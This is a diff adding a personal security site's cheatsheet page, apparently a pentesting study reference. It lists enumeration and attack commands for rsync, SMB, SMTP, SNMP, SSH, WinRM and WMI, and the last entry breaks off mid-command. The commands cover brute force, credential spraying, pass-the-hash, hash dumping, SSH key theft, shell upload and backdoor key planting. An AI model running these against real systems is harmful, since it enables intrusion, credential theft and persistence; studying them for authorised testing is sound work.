@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Cheatsheets | d3vilsec</title>
+<meta name="keywords" content="">
+<meta name="description" content="Quick reference guides for Linux, Windows, pentesting, and networking.">
+<meta name="author" content="d3vilsec">
+<link rel="canonical" href="http://localhost:1313/cheatsheets/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/cheatsheets/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/cheatsheets/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="d3vilsec (Alt + H)">d3vilsec</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/cheatsheets/" title="Cheatsheets">
+                    <span class="active">Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+  <h1>
+    Cheatsheets
+  </h1>
+  <div class="post-description">
+    Quick reference guides for Linux, Windows, pentesting, and networking.
+  </div>
+</header>
+<div class="post-content md-content"><p>A collection of quick reference guides I use regularly. Built for myself, shared for everyone.</p>
+
+
+</div>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Rsync Enumeration Cheatsheet Default Port: 873 (TCP)
+Detection nmap -p 873 &lt;ip&gt; nmap -p 873 -sV &lt;ip&gt; nmap -p 873 --script rsync-list-modules &lt;ip&gt; nc -nv &lt;ip&gt; 873 List Available Modules (Shares) # List modules (no auth) rsync -av --list-only rsync://&lt;ip&gt;/ rsync rsync://&lt;ip&gt;/ # nc banner grab nc -nv &lt;ip&gt; 873 # Then type: #list Enumerate Files in a Module rsync -av --list-only rsync://&lt;ip&gt;/&lt;module&gt;/ rsync -av --list-only rsync://&lt;ip&gt;/&lt;module&gt;/subdir/ # Recursive listing of entire module rsync -r --list-only rsync://&lt;ip&gt;/&lt;module&gt;/ Download Files # Download single file rsync rsync://&lt;ip&gt;/&lt;module&gt;/file.txt ./ # Download entire module rsync -av rsync://&lt;ip&gt;/&lt;module&gt;/ ./local_copy/ # With credentials rsync -av rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ ./ rsync --password-file=pass.txt rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ ./ # Dry run (see what would be downloaded) rsync -av --dry-run rsync://&lt;ip&gt;/&lt;module&gt;/ ./ Upload Files # Upload single file rsync -av ./shell.php rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ # Upload directory rsync -av ./payload/ rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/uploads/ # With password file rsync --password-file=pass.txt -av ./file rsync://&lt;user&gt;@&lt;ip&gt;/&lt;module&gt;/ High-Value Paths to Check rsync -av --list-only rsync://&lt;ip&gt;/home/ rsync -av --list-only rsync://&lt;ip&gt;/root/ rsync -av --list-only rsync://&lt;ip&gt;/etc/ rsync -av --list-only rsync://&lt;ip&gt;/backup/ rsync -av --list-only rsync://&lt;ip&gt;/var/www/ rsync -av --list-only rsync://&lt;ip&gt;/.ssh/ SSH Key Theft &amp; Planting # Download .ssh directory rsync -av rsync://&lt;ip&gt;/home/&lt;user&gt;/.ssh/ ./stolen_keys/ # Plant authorized_keys (if write access) rsync -av ~/.ssh/id_rsa.pub rsync://&lt;user&gt;@&lt;ip&gt;/home/&lt;user&gt;/.ssh/authorized_keys Nmap Scripts nmap -p 873 --script rsync-list-modules &lt;ip&gt; </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>1 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/rsync/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>SMB Enumeration Cheatsheet Default Ports: 445 (TCP), 139 (TCP/NetBIOS), 137–138 (UDP)
+Initial Scanning nmap -p 139,445 -sV &lt;ip&gt; nmap -p 445 --script smb-os-discovery &lt;ip&gt; nmap -p 445 --script smb-security-mode &lt;ip&gt; nmap -p 445 --script smb2-security-mode &lt;ip&gt; nmap -p 139,445 --script smb-* &lt;ip&gt; # All SMB scripts nmap -p 445 --script smb-vuln-* &lt;ip&gt; # All vuln checks NetBIOS / NBT Scanning nbtscan &lt;ip&gt; nbtscan -r 192.168.1.0/24 nmblookup -A &lt;ip&gt; enum4linux / enum4linux-ng # Classic enum4linux -a &lt;ip&gt; # All checks enum4linux -u &lt;user&gt; -p &lt;pass&gt; &lt;ip&gt; # Authenticated enum4linux -S &lt;ip&gt; # Shares only enum4linux -U &lt;ip&gt; # Users only enum4linux -P &lt;ip&gt; # Password policy # Newer (recommended) enum4linux-ng -A &lt;ip&gt; enum4linux-ng -A &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; enum4linux-ng -A &lt;ip&gt; -oA output smbclient # List shares smbclient -L //&lt;ip&gt;/ -N # Null session smbclient -L //&lt;ip&gt;/ -U &lt;user&gt;%&lt;pass&gt; # Authenticated # Connect to share smbclient //&lt;ip&gt;/&lt;share&gt; -N smbclient //&lt;ip&gt;/&lt;share&gt; -U &lt;user&gt;%&lt;pass&gt; smbclient //&lt;ip&gt;/&lt;share&gt; -U &lt;domain&gt;/&lt;user&gt;%&lt;pass&gt; # Within smbclient shell ls # List files cd &lt;dir&gt; # Change directory get &lt;file&gt; # Download file put &lt;file&gt; # Upload file recurse ON # Enable recursive operations prompt OFF # Disable prompts mget * # Download everything mput * # Upload everything CrackMapExec (CME) # Basic info crackmapexec smb &lt;ip&gt; crackmapexec smb 192.168.1.0/24 # Authenticated enum crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --shares crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --users crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --groups crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --sessions crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --loggedon-users crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --local-groups # Credential spraying crackmapexec smb 192.168.1.0/24 -u &lt;user&gt; -p &lt;pass&gt; --continue-on-success # Pass-the-Hash crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -H &lt;nthash&gt; # Command execution crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &#39;whoami&#39; # CMD crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -X &#39;whoami&#39; # PowerShell # Dump SAM/LSA crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --sam crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; --lsa crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -M ntdsutil # NTDS.dit impacket Tools python3 smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; python3 samrdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; python3 rpcdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; python3 lookupsid.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; python3 secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; # Dump all hashes python3 secretsdump.py -just-dc-ntlm &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; Mounting SMB Shares # Linux mount sudo mount -t cifs //&lt;ip&gt;/&lt;share&gt; /mnt/smb -o username=&lt;user&gt;,password=&lt;pass&gt; sudo mount -t cifs //&lt;ip&gt;/&lt;share&gt; /mnt/smb -o username=&lt;user&gt;,password=&lt;pass&gt;,domain=&lt;domain&gt; Key Vulnerabilities CVE Name Description CVE-2017-0144 EternalBlue / MS17-010 SMBv1 RCE — WannaCry / NotPetya CVE-2020-0796 SMBGhost SMBv3.1.1 compression RCE CVE-2021-34527 PrintNightmare Print Spooler RCE via SMB # EternalBlue check nmap -p 445 --script smb-vuln-ms17-010 &lt;ip&gt; use auxiliary/scanner/smb/smb_ms17_010 # SMBGhost check nmap -p 445 --script smb-vuln-cve2020-0796 &lt;ip&gt; use auxiliary/scanner/smb/cve_2020_0796_smbghost </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>3 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/smb/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>SMTP Enumeration Cheatsheet Default Ports: 25 (SMTP), 587 (Submission/STARTTLS), 465 (SMTPS)
+Banner Grabbing nc -nv &lt;ip&gt; 25 telnet &lt;ip&gt; 25 openssl s_client -starttls smtp -connect &lt;ip&gt;:587 openssl s_client -connect &lt;ip&gt;:465 Manual SMTP Commands HELO &lt;domain&gt; # Basic hello EHLO &lt;domain&gt; # Extended hello (lists capabilities) AUTH LOGIN # Start base64 auth AUTH PLAIN # Plain auth VRFY &lt;user&gt; # Verify if user exists EXPN &lt;list&gt; # Expand mailing list members RCPT TO:&lt;user@domain&gt; # Verify recipient (within MAIL flow) MAIL FROM:&lt;attacker@test.com&gt; RCPT TO:&lt;target@domain&gt; DATA # Begin message body . # End message (single dot on its own line) RSET # Reset connection state QUIT Capabilities Enumeration # See what the server supports after EHLO nc &lt;ip&gt; 25 EHLO test.com # Common capabilities to note: # STARTTLS, AUTH LOGIN/PLAIN/NTLM, SIZE, PIPELINING, VRFY, EXPN User Enumeration # smtp-user-enum tool smtp-user-enum -M VRFY -U users.txt -t &lt;ip&gt; smtp-user-enum -M EXPN -U users.txt -t &lt;ip&gt; smtp-user-enum -M RCPT -U users.txt -t &lt;ip&gt; -D &lt;domain&gt; # Manual VRFY loop for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 &lt;ip&gt; 25 2&gt;/dev/null | grep &#34;^250&#34; done # Response codes: # 250 = user exists # 252 = can&#39;t verify but will attempt delivery # 550 = user does not exist Nmap Scripts nmap -p 25 --script smtp-commands &lt;ip&gt; nmap -p 25 --script smtp-enum-users &lt;ip&gt; nmap -p 25 --script smtp-open-relay &lt;ip&gt; nmap -p 25 --script smtp-brute &lt;ip&gt; nmap -p 25 --script smtp-ntlm-info &lt;ip&gt; # Windows NTLM info leak nmap -p 25 --script smtp-vuln-cve2010-4344 &lt;ip&gt; # Exim heap overflow nmap -p 25,587,465 --script smtp-* &lt;ip&gt; Open Relay Testing nc &lt;ip&gt; 25 EHLO test.com MAIL FROM:&lt;attacker@attacker.com&gt; RCPT TO:&lt;victim@external-domain.com&gt; # If accepted = open relay! DATA Subject: relay test This is a test. . QUIT # Automated nmap -p 25 --script smtp-open-relay \ --script-args smtp-open-relay.from=sender@test.com,smtp-open-relay.to=victim@gmail.com &lt;ip&gt; Metasploit use auxiliary/scanner/smtp/smtp_version use auxiliary/scanner/smtp/smtp_enum use auxiliary/scanner/smtp/smtp_relay NTLM Info Leak (Windows SMTP) # Triggers Windows SMTP servers to reveal hostname, domain, OS version nmap -p 25 --script smtp-ntlm-info &lt;ip&gt; # Manual nc &lt;ip&gt; 25 EHLO test AUTH NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= # Decode the Base64 response with ntlmdecoder or responder Useful Wordlists /usr/share/seclists/Usernames/top-usernames-shortlist.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/smtp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>SNMP Enumeration Cheatsheet Default Ports: 161 (UDP — queries), 162 (UDP — traps)
+SNMP Versions Version Auth Notes v1 Community string Cleartext, oldest v2c Community string Cleartext, most common v3 Username &#43; auth &#43; encryption Secure, rarely misconfigured Detection nmap -sU -p 161 &lt;ip&gt; nmap -sU -p 161 -sV &lt;ip&gt; nmap -sU -p 161 --script snmp-info &lt;ip&gt; Community String Brute Force # onesixtyone (fast UDP brute) onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt &lt;ip&gt; onesixtyone -c community.txt -i ips.txt # Nmap nmap -sU -p 161 --script snmp-brute &lt;ip&gt; nmap -sU -p 161 --script snmp-brute \ --script-args snmp-brute.communitiesdb=communities.txt &lt;ip&gt; # Metasploit use auxiliary/scanner/snmp/snmp_login set RHOSTS &lt;ip&gt; run snmpwalk — Walking the MIB Tree # Full walk (v1/v2c) snmpwalk -v1 -c public &lt;ip&gt; snmpwalk -v2c -c public &lt;ip&gt; # Target specific OIDs snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.1 # System info snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.25.4.2 # Running processes snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.25.6.3 # Installed software snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.6.13.1.3 # Open TCP ports snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.4.1.77.1.2.25 # Windows user accounts snmpwalk -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.2.2 # Network interfaces # SNMPv3 snmpwalk -v3 -u &lt;user&gt; -l AuthPriv \ -a MD5 -A &lt;authpass&gt; -x DES -X &lt;privpass&gt; &lt;ip&gt; snmpget — Single OID Query snmpget -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.1.1.0 # sysDescr snmpget -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.1.5.0 # sysName (hostname) snmpget -v2c -c public &lt;ip&gt; 1.3.6.1.2.1.1.6.0 # sysLocation snmp-check snmp-check &lt;ip&gt; snmp-check &lt;ip&gt; -c public snmp-check &lt;ip&gt; -c public -v 2c braa — Bulk SNMP braa public@&lt;ip&gt;:.1.3.6.* braa public@192.168.1.1-254:.1.3.6.1.2.1.1.1.0 Nmap SNMP Scripts nmap -sU -p 161 --script snmp-info &lt;ip&gt; nmap -sU -p 161 --script snmp-sysdescr &lt;ip&gt; nmap -sU -p 161 --script snmp-interfaces &lt;ip&gt; nmap -sU -p 161 --script snmp-processes &lt;ip&gt; nmap -sU -p 161 --script snmp-win32-users &lt;ip&gt; nmap -sU -p 161 --script snmp-win32-services &lt;ip&gt; nmap -sU -p 161 --script snmp-win32-software &lt;ip&gt; nmap -sU -p 161 --script snmp-* &lt;ip&gt; Key OIDs Reference OID Description 1.3.6.1.2.1.1.1.0 System description 1.3.6.1.2.1.1.3.0 System uptime 1.3.6.1.2.1.1.5.0 Hostname 1.3.6.1.2.1.1.6.0 System location 1.3.6.1.2.1.25.1.6.0 Running OS processes 1.3.6.1.2.1.25.4.2.1.2 Process names 1.3.6.1.2.1.25.6.3.1.2 Installed packages 1.3.6.1.4.1.77.1.2.25 Windows user accounts 1.3.6.1.2.1.6.13.1.3 TCP open ports 1.3.6.1.2.1.2.2.1.2 Interface names 1.3.6.1.2.1.2.2.1.11 Interface in-packets Common Community Strings public private manager community snmp cisco monitor 0 internal </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/snmp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>SSH Enumeration Cheatsheet Default Port: 22 (TCP)
+Banner &amp; Info Gathering nc -nv &lt;ip&gt; 22 # Banner grab ssh -v &lt;user&gt;@&lt;ip&gt; # Verbose handshake output ssh -V # Local SSH client version # Nmap scripts nmap -p 22 -sV &lt;ip&gt; nmap -p 22 --script ssh-hostkey &lt;ip&gt; nmap -p 22 --script ssh2-enum-algos &lt;ip&gt; nmap -p 22 --script ssh-auth-methods \ --script-args ssh.user=&lt;user&gt; &lt;ip&gt; nmap -p 22 --script sshv1 &lt;ip&gt; # Check for insecure SSHv1 ssh-audit (Configuration Security Check) ssh-audit &lt;ip&gt; ssh-audit &lt;ip&gt; -p 22 # Flags to note: # [fail] = critical issue # [warn] = should be fixed # Lists: KEX, hostkey, encryption, MAC algorithms User Enumeration # CVE-2018-15473 (OpenSSH &lt; 7.7 username enumeration) python3 ssh_user_enum.py --userList users.txt --ip &lt;ip&gt; # Metasploit use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS &lt;ip&gt; set USER_FILE users.txt run Brute Force # Hydra hydra -l &lt;user&gt; -P wordlist.txt ssh://&lt;ip&gt; hydra -L users.txt -P wordlist.txt ssh://&lt;ip&gt; hydra -l &lt;user&gt; -P wordlist.txt -s 2222 ssh://&lt;ip&gt; # Custom port # Medusa medusa -h &lt;ip&gt; -u &lt;user&gt; -P wordlist.txt -M ssh # Nmap nmap -p 22 --script ssh-brute &lt;ip&gt; nmap -p 22 --script ssh-brute \ --script-args userdb=users.txt,passdb=pass.txt &lt;ip&gt; # Metasploit use auxiliary/scanner/ssh/ssh_login set RHOSTS &lt;ip&gt; set USERNAME &lt;user&gt; set PASS_FILE wordlist.txt run Key-Based Attacks # Connect with private key ssh -i id_rsa &lt;user&gt;@&lt;ip&gt; chmod 600 id_rsa &amp;&amp; ssh -i id_rsa &lt;user&gt;@&lt;ip&gt; # Crack passphrase on private key ssh2john id_rsa &gt; ssh_hash.txt john ssh_hash.txt --wordlist=wordlist.txt hashcat -m 22921 ssh_hash.txt wordlist.txt # Ed25519 hashcat -m 22911 ssh_hash.txt wordlist.txt # RSA # Scan for keys (key harvesting after initial access) find / -name &#34;id_rsa&#34; -o -name &#34;id_ecdsa&#34; -o -name &#34;id_ed25519&#34; 2&gt;/dev/null find / -name &#34;*.pem&#34; -o -name &#34;*.key&#34; 2&gt;/dev/null SSH Key Scanning # Collect host keys ssh-keyscan &lt;ip&gt; ssh-keyscan -t rsa,ecdsa,ed25519 &lt;ip&gt; ssh-keyscan -p 2222 &lt;ip&gt; # Scan range ssh-keyscan -f hosts.txt &gt; known_hosts Interesting Files to Grab Post-Access ~/.ssh/id_rsa # Private key ~/.ssh/id_rsa.pub # Public key ~/.ssh/authorized_keys # Authorized keys (add yours for persistence) ~/.ssh/known_hosts # Previous connections (network map) /etc/ssh/sshd_config # Server configuration /etc/ssh/ssh_host_rsa_key # Host private key Add Backdoor SSH Key (Post-Exploitation) # On attacker machine ssh-keygen -t rsa -b 4096 -f backdoor # On target (append to authorized_keys) echo &#34;ssh-rsa AAAA...&#34; &gt;&gt; ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys # Connect back ssh -i backdoor &lt;user&gt;@&lt;ip&gt; Common Misconfigurations to Check PermitRootLogin yes — Root login allowed PasswordAuthentication yes — Passwords accepted (brutable) PermitEmptyPasswords yes — Blank passwords allowed AuthorizedKeysFile .ssh/authorized_keys — Key auth path AllowUsers / DenyUsers — User restrictions Port 22 — Non-standard port may indicate stealth </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/ssh/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>WinRM Enumeration Cheatsheet Default Ports: 5985 (HTTP / WS-Management), 5986 (HTTPS)
+What is WinRM? Windows Remote Management — Microsoft’s implementation of WS-Management. Used for remote PowerShell, remote command execution, and administration.
+Detection nmap -p 5985,5986 &lt;ip&gt; nmap -p 5985,5986 -sV &lt;ip&gt; curl -s http://&lt;ip&gt;:5985/wsman curl -sk https://&lt;ip&gt;:5986/wsman Evil-WinRM # Password auth (HTTP) evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; # SSL (HTTPS, port 5986) evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -S # Pass-the-Hash (NTLM) evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -H &lt;nthash&gt; # With scripts and executables directory evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; \ -s /path/to/ps1_scripts/ \ -e /path/to/executables/ # Within evil-winrm shell menu # Show built-in commands upload /local/file.exe # Upload file download C:\file.txt # Download file Invoke-Binary /local/exe # Run local exe in memory bypass_uac # UAC bypass CrackMapExec # Test credentials crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; crackmapexec winrm 192.168.1.0/24 -u &lt;user&gt; -p &lt;pass&gt; # Credential spray crackmapexec winrm &lt;ip&gt; -u users.txt -p &lt;pass&gt; crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p wordlist.txt # Pass-the-Hash crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -H &lt;nthash&gt; # Execute commands crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &#39;whoami&#39; # CMD crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -X &#39;whoami&#39; # PowerShell crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -X &#39;Get-Process&#39; PowerShell / Windows Native # Test WinRM connectivity Test-WSMan -ComputerName &lt;ip&gt; Test-WSMan -ComputerName &lt;ip&gt; -UseSSL # Interactive remote session Enter-PSSession -ComputerName &lt;ip&gt; -Credential &lt;user&gt; Enter-PSSession -ComputerName &lt;ip&gt; -UseSSL -Credential &lt;user&gt; # Non-interactive / scripted $cred = Get-Credential $sess = New-PSSession -ComputerName &lt;ip&gt; -Credential $cred Invoke-Command -Session $sess -ScriptBlock { whoami; hostname } Invoke-Command -ComputerName &lt;ip&gt; -Credential $cred -ScriptBlock { ipconfig } # Copy files over WinRM Copy-Item -Path C:\local\file.exe -Destination C:\remote\ -ToSession $sess Copy-Item -Path C:\remote\loot.txt -Destination C:\local\ -FromSession $sess impacket # winrm_exec (alternative) python3 winrm_exec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; Brute Force crackmapexec winrm &lt;ip&gt; -u &lt;user&gt; -p wordlist.txt hydra -l &lt;user&gt; -P wordlist.txt &lt;ip&gt; -s 5985 http-post-form \ &#34;/wsman:Username=^USER^&amp;Password=^PASS^:401&#34; Common Scenarios Pwned user is in group: &#34;Remote Management Users&#34; → Can use WinRM &#34;Administrators&#34; → Full access via WinRM Check group membership: net localgroup &#34;Remote Management Users&#34; Key Facts Requires user to be in Remote Management Users or Administrators group Can be enabled with: Enable-PSRemoting -Force Firewall rule: WinRM-HTTP-In-TCP (port 5985) Often enabled on Domain Controllers and management servers </p>
+  </div>
+  <footer class="entry-footer">
+
+<span>2 min</span>&nbsp;·&nbsp;<span>d3vilsec</span></footer>
+  <a class="entry-link" aria-label="post link to " href="http://localhost:1313/cheatsheets/pentesting/footprinting/winrm/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>WMI Enumeration Cheatsheet Default Ports: 135 (DCOM endpoint mapper), dynamic high ports (TCP 49152–65535)
+What is WMI? Windows Management Instrumentation — a core Windows API for querying system state and executing code remotely. Uses DCOM over RPC.
+Detection nmap -p 135 &lt;ip&gt; nmap -p 135 -sV &lt;ip&gt; nmap -p 135 --script msrpc-enum &lt;ip&gt; impacket — wmiexec.py # Interactive shell python3 wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; # Single command python3 wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; &#34;whoami&#34; python3 wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; &#34;ipconfig /all&#34; # Pass-the-Hash python3 wmiexec.py -hashes :&lt;nthash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; python3 wmiexec.py -hashes &lt;lmhash&gt;:&lt;nthash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; # Without domain (local account) python3 wmiexec.py ./&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; CrackMapExec crackmapexec wmi &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; crackmapexec wmi &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &#39;whoami&#39; crackmapexec wmi &lt;ip&gt; -u &lt;user&gt; -H &lt;nthash&gt; crackmapexec wmi 192.168.1.0/24 -u &lt;user&gt; -p &lt;pass&gt; PowerShell WMI (Local &amp; Remote) # Local system queries Get-WmiObject -Class Win32_OperatingSystem Get-WmiObject -Class Win32_ComputerSystem Get-WmiObject -Class Win32_Process Get-WmiObject -Class Win32_UserAccount Get-WmiObject -Class Win32_Group Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where IPAddress -ne $null Get-WmiObject -Class Win32_Service | Where-Object { $_.State -eq &#34;Running&#34; } Get-WmiObject -Class Win32_Product # Installed software (slow) Get-WmiObject -Class Win32_LogicalDisk Get-WmiObject -Class Win32_StartupCommand # Startup items # Modern equivalent (CIM) Get-CimInstance -ClassName Win32_OperatingSystem Get-CimInstance -ClassName Win32_Process # Remote queries $cred = Get-Credential Get-WmiObject -Class Win32_OperatingSystem -ComputerName &lt;ip&gt; -Credential $cred Get-WmiObject -Class Win32_Process -ComputerName &lt;ip&gt; -Credential $cred PowerShell WMI Remote Code Execution # Execute command via WMI (leaves process behind) $cred = Get-Credential Invoke-WmiMethod -Class Win32_Process -Name 